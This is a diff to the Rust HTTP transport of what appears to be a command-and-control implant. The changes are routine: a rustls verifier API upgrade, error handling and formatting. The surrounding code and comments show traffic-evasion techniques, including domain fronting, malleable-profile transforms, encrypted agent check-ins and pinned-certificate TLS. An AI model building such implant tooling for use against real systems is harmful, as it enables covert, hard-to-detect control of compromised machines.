@@ -33,10 +33,10 @@
 //!   is used as a fallback. reqwest does not provide per-request SNI control;
 //!   the URL-rewrite approach is the only portable mechanism.
 
-use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use base64::Engine;
+use common::lock::MutexExt;
 use common::{CryptoSession, Message, Transport};
 use sha2::{Digest, Sha256};
 use std::sync::atomic::{AtomicUsize, Ordering};
@@ -255,13 +255,14 @@ fn days_to_ymd(days: u64) -> (u32, u32, u32) {
 /// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
 /// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
 /// CA-based verification.
+#[derive(Debug)]
 struct FingerprintVerifier {
     expected_fingerprint: Option<String>,
-    webpki: rustls::client::WebPkiVerifier,
+    webpki: Arc<rustls::client::WebPkiServerVerifier>,
 }
 
 impl FingerprintVerifier {
-    fn new(expected_fingerprint: Option<String>) -> Self {
+    fn new(expected_fingerprint: Option<String>) -> Result<Self> {
         let mut root_store = rustls::RootCertStore::empty();
         for cert in rustls_native_certs::load_native_certs()
             .certs
@@ -270,11 +271,13 @@ impl FingerprintVerifier {
         {
             root_store.add(cert).ok();
         }
-        let webpki = rustls::client::WebPkiVerifier::new(root_store, None);
-        Self {
+        let webpki = rustls::client::WebPkiServerVerifier::builder(Arc::new(root_store))
+            .build()
+            .map_err(|e| anyhow!("failed to build WebPKI verifier: {e}"))?;
+        Ok(Self {
             expected_fingerprint,
             webpki,
-        }
+        })
     }
 }
 
@@ -510,7 +513,7 @@ impl HttpTransport {
         // client instances are created for redirectors with domain fronting
         // for future per-client TLS flexibility (e.g. JA3 fingerprints).
         let client = if cert_fingerprint.is_some() {
-            let verifier = FingerprintVerifier::new(cert_fingerprint.clone());
+            let verifier = FingerprintVerifier::new(cert_fingerprint.clone())?;
             let config = rustls::ClientConfig::builder()
                 .dangerous()
                 .with_custom_certificate_verifier(Arc::new(verifier))
@@ -558,7 +561,7 @@ impl HttpTransport {
                 // request-build time (see `build_fronted_request`), so we just
                 // need a standard TLS client here.
                 let redir_client = if cert_fingerprint.is_some() {
-                    let verifier = FingerprintVerifier::new(cert_fingerprint.clone());
+                    let verifier = FingerprintVerifier::new(cert_fingerprint.clone())?;
                     let config = rustls::ClientConfig::builder()
                         .dangerous()
                         .with_custom_certificate_verifier(Arc::new(verifier))
@@ -647,7 +650,10 @@ impl HttpTransport {
             Err(_) => match format!("https://{}", url).parse() {
                 Ok(u) => u,
                 Err(_) => {
-                    tracing::warn!("c2_http: failed to parse URL '{}' for fronting; using front as host", url);
+                    tracing::warn!(
+                        "c2_http: failed to parse URL '{}' for fronting; using front as host",
+                        url
+                    );
                     format!("https://{}/", front).parse().unwrap_or_else(|_| {
                         // Last resort: this URL is hardcoded and always valid.
                         url::Url::parse("https://localhost/").expect("hardcoded URL must parse")
@@ -826,7 +832,9 @@ impl HttpTransport {
     /// Returns `None` if the ECDH handshake has already completed (i.e.
     /// the session key has been derived from a server response).
     fn ecdh_header_value(&self) -> Option<String> {
-        self.ecdh_client.as_ref().map(|m| m.lock_recover().header_value())
+        self.ecdh_client
+            .as_ref()
+            .map(|m| m.lock_recover().header_value())
     }
 
     /// Attempt to upgrade the session key from the server's ECDH response.
@@ -867,13 +875,17 @@ impl HttpTransport {
         let mut client = match ecdh_mutex.into_inner() {
             Ok(c) => c,
             Err(e) => {
-                tracing::warn!("c2_http: ECDH mutex poisoned during upgrade: {e}; recovering client");
+                tracing::warn!(
+                    "c2_http: ECDH mutex poisoned during upgrade: {e}; recovering client"
+                );
                 e.into_inner()
             }
         };
         match client.derive_session_from_response(&ecdh_header) {
             Ok(session) => {
-                tracing::info!("HTTP ECDH handshake completed — forward-secrecy session established");
+                tracing::info!(
+                    "HTTP ECDH handshake completed — forward-secrecy session established"
+                );
                 self.session = session;
             }
             Err(e) => {
@@ -1279,11 +1291,11 @@ impl Transport for HttpTransport {
 
         // Use http_get for checkins/tasking.
         let txn =
-            self.profile.http_get.as_ref().ok_or_else(|| {
+            self.profile.http_get.clone().ok_or_else(|| {
                 anyhow!("http_get transaction not configured in malleable profile")
             })?;
 
-        let uri = Self::next_uri(txn, &self.get_uri_idx);
+        let uri = Self::next_uri(&txn, &self.get_uri_idx);
 
         // ── OPSEC: agent_id is never transmitted in plaintext. ─────────
         //
@@ -1307,7 +1319,7 @@ impl Transport for HttpTransport {
         let ciphertext = self.session.encrypt(&serialized);
 
         // Apply the client transform pipeline to the checkin payload.
-        let transformed = Self::apply_client_transform(txn, &ciphertext);
+        let transformed = Self::apply_client_transform(&txn, &ciphertext);
 
         // Prepare mutable URI and body for metadata delivery.
         let mut final_uri = uri.clone();
@@ -1320,10 +1332,10 @@ impl Transport for HttpTransport {
         let req = self.build_request_for_endpoint(method.clone(), &endpoint, &final_uri);
 
         // Apply profile headers.
-        let req = self.apply_profile_headers(txn, req, &encrypted_id);
+        let req = self.apply_profile_headers(&txn, req, &encrypted_id);
 
         // Apply metadata delivery.
-        let req = self.apply_metadata_delivery(txn, req, &encrypted_id, &mut final_uri, &mut body);
+        let req = self.apply_metadata_delivery(&txn, req, &encrypted_id, &mut final_uri, &mut body);
 
         // Rebuild with updated URI if metadata delivery changed it.
         let req = if final_uri != uri {
@@ -1398,10 +1410,10 @@ impl Transport for HttpTransport {
         // Apply output delivery extraction: if the profile specifies an output
         // config, extract the tasking from the appropriate location (header,
         // cookie, or body). If None, this returns the raw body bytes as-is.
-        let extracted = self.apply_output_delivery(txn, &bytes, &resp_headers);
+        let extracted = self.apply_output_delivery(&txn, &bytes, &resp_headers);
 
         // Reverse the server transform pipeline.
-        let server_payload = match Self::reverse_server_transform(txn, &extracted) {
+        let server_payload = match Self::reverse_server_transform(&txn, &extracted) {
             Ok(p) => p,
             Err(e) => {
                 // Transform decode failure — increment failure counter.
@@ -1437,7 +1449,8 @@ impl Transport for HttpTransport {
             }
         };
 
-        let msg = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v)?;
+        let msg = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy())
+            .map(|(v, _)| v)?;
         Ok(msg)
     }
 }
